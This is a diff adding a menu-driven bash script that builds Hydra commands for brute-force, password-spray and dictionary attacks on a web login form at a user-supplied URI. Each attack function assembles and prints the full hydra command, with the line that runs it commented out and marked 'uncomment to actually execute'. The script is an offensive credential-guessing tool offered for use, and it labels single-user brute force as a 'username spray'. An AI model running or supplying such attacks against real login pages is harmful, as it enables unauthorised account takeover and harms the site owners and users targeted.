@@ -1,0 +1,148 @@
+#!/bin/bash
+
+# ANSI color codes
+RED='\033[0;31m'
+NC='\033[0m' # No Color
+
+# Function to display the attack type menu
+display_attack_type_menu() {
+    echo "===== Choose Attack Type ====="
+    echo "1. Username Spray Attack (Single Username, Multiple Passwords)"
+    echo "2. Password Spray Attack (Multiple Usernames, Single Password)"
+    echo "3. Dictionary Attack (Multiple Usernames, Multiple Passwords)"
+    echo "4. Exit"
+    echo "=============================="
+}
+
+# Variables
+usernames_wordlist=""
+passwords_wordlist=""
+target_uri=""
+invalid_string=""
+attack_type=""
+single_username=""
+single_password=""
+
+# Function to display and set parameters for the chosen attack type
+display_parameter_menu() {
+    while true; do
+        clear
+        if [[ "$attack_type" == "1" ]]; then
+            echo "===== Set Parameters for Username Spray Attack ====="
+            echo -e "1. Set Single Username\t\t(Current: ${RED}$single_username${NC})"
+            echo -e "2. Set Passwords Wordlist\t(Current: ${RED}$passwords_wordlist${NC})"
+            echo -e "3. Set Target URI\t\t(Current: ${RED}$target_uri${NC})"
+            echo -e "4. Set Invalid Password String (Optional)\t(Current: ${RED}$invalid_string${NC})"
+            echo "5. Start Attack"
+            echo "6. Back to Attack Type Menu"
+        elif [[ "$attack_type" == "2" ]]; then
+            echo "===== Set Parameters for Password Spray Attack ====="
+            echo -e "1. Set Usernames Wordlist\t(Current: ${RED}$usernames_wordlist${NC})"
+            echo -e "2. Set Single Password\t\t(Current: ${RED}$single_password${NC})"
+            echo -e "3. Set Target URI\t\t(Current: ${RED}$target_uri${NC})"
+            echo -e "4. Set Invalid Password String (Optional)\t(Current: ${RED}$invalid_string${NC})"
+            echo "5. Start Attack"
+            echo "6. Back to Attack Type Menu"
+        elif [[ "$attack_type" == "3" ]]; then
+            echo "===== Set Parameters for Dictionary Attack ====="
+            echo -e "1. Set Usernames Wordlist\t(Current: ${RED}$usernames_wordlist${NC})"
+            echo -e "2. Set Passwords Wordlist\t(Current: ${RED}$passwords_wordlist${NC})"
+            echo -e "3. Set Target URI\t\t(Current: ${RED}$target_uri${NC})"
+            echo -e "4. Set Invalid Password String (Optional)\t(Current: ${RED}$invalid_string${NC})"
+            echo "5. Start Attack"
+            echo "6. Back to Attack Type Menu"
+        fi
+        echo "==================================================="
+        read -p "Enter your choice: " param_choice
+
+        if [[ "$param_choice" == "1" ]]; then
+            if [[ "$attack_type" == "1" ]]; then
+                read -p "Enter Single Username: " single_username
+            elif [[ "$attack_type" == "2" || "$attack_type" == "3" ]]; then
+                read -p "Enter Usernames Wordlist file: " usernames_wordlist
+            fi
+        elif [[ "$param_choice" == "2" ]]; then
+            if [[ "$attack_type" == "1" || "$attack_type" == "3" ]]; then
+                read -p "Enter Passwords Wordlist file: " passwords_wordlist
+            elif [[ "$attack_type" == "2" ]]; then
+                read -p "Enter Single Password: " single_password
+            fi
+        elif [[ "$param_choice" == "3" ]]; then
+            read -p "Enter Target URI: " target_uri
+        elif [[ "$param_choice" == "4" ]]; then
+            read -p "Enter Invalid Password String (Optional): " invalid_string
+        elif [[ "$param_choice" == "5" ]]; then
+            if [[ "$attack_type" == "1" ]]; then
+                username_spray_attack
+            elif [[ "$attack_type" == "2" ]]; then
+                password_spray_attack
+            elif [[ "$attack_type" == "3" ]]; then
+                dictionary_attack
+            fi
+        elif [[ "$param_choice" == "6" ]]; then
+            break
+        else
+            echo "Invalid choice. Please enter a number from the menu."
+        fi
+    done
+}
+
+# Function to start username spray attack
+username_spray_attack() {
+    if [[ -z "$single_username" || -z "$passwords_wordlist" || -z "$target_uri" ]]; then
+        echo "Error: Missing required inputs."
+        return
+    fi
+
+    echo "Starting username spray attack with Hydra..."
+    hydra_command="hydra -l $single_username -P $passwords_wordlist $target_uri http-post-form \"username=^USER^&password=^PASS^:F=$invalid_string\" -vV"
+    echo "Hydra command: $hydra_command"
+    # Uncomment the line below to actually execute the command
+    # eval $hydra_command
+}
+
+# Function to start password spray attack
+password_spray_attack() {
+    if [[ -z "$usernames_wordlist" || -z "$single_password" || -z "$target_uri" ]]; then
+        echo "Error: Missing required inputs."
+        return
+    fi
+
+    echo "Starting password spray attack with Hydra..."
+    hydra_command="hydra -L $usernames_wordlist -p $single_password $target_uri http-post-form \"username=^USER^&password=^PASS^:F=$invalid_string\" -vV"
+    echo "Hydra command: $hydra_command"
+    # Uncomment the line below to actually execute the command
+    # eval $hydra_command
+}
+
+# Function to start dictionary attack
+dictionary_attack() {
+    if [[ -z "$usernames_wordlist" || -z "$passwords_wordlist" || -z "$target_uri" ]]; then
+        echo "Error: Missing required inputs."
+        return
+    fi
+
+    echo "Starting dictionary attack with Hydra..."
+    hydra_command="hydra -L $usernames_wordlist -P $passwords_wordlist $target_uri http-post-form \"username=^USER^&password=^PASS^:F=$invalid_string\" -vV"
+    echo "Hydra command: $hydra_command"
+    # Uncomment the line below to actually execute the command
+    # eval $hydra_command
+}
+
+# Main loop
+while true; do
+    display_attack_type_menu
+
+    read -p "Enter your choice: " attack_choice
+    if [[ "$attack_choice" == "1" || "$attack_choice" == "2" || "$attack_choice" == "3" ]]; then
+        attack_type="$attack_choice"
+        display_parameter_menu
+    elif [[ "$attack_choice" == "4" ]]; then
+        echo "Exiting script."
+        exit 0
+    else
+        echo "Invalid choice. Please enter a number from the menu."
+    fi
+
+    echo
+done
